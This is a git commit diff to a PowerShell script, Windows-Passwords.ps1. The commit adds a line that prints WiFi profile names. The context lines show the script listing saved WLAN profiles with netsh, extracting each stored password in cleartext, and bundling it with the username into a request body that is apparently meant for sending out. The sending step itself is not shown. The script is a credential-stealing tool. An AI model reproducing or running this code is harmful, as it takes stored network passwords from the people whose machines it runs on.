b032befef74fd72036b3f3a7aa4bfb116479e025
Javi Rufo <150443755+javirufo-ies@users.noreply.github.com>
2025-12-10 08:34:42 +0100

    Add output for WIFI profile names

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -3,7 +3,7 @@
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
-
+	Write-Output "WIFI "+$wlan
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
 		'content' = [string]$passw
